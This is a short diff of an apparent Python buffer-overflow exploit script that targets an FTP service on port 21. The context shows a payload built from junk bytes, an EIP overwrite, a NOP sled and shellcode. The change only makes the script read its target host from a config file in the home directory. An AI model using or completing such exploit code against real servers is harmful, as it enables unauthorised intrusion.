@@ -10,10 +10,11 @@ def createshellcode():
     buff = junk1 + eip + nops + shellcode + junk2
 
 def checkVulnerability():
-    import socket, sys
+    import socket, sys, os
     from configparser import ConfigParser
     config = ConfigParser()
-    config.read("./config.cfg")
+    path = str(os.path.expanduser('~')) + "/config.cfg"
+    config.read(path)
     ip = config['DEFAULT']['rhost']
     port = int("21")
     print("Current Target: %s:%d" % (ip, int(port)))
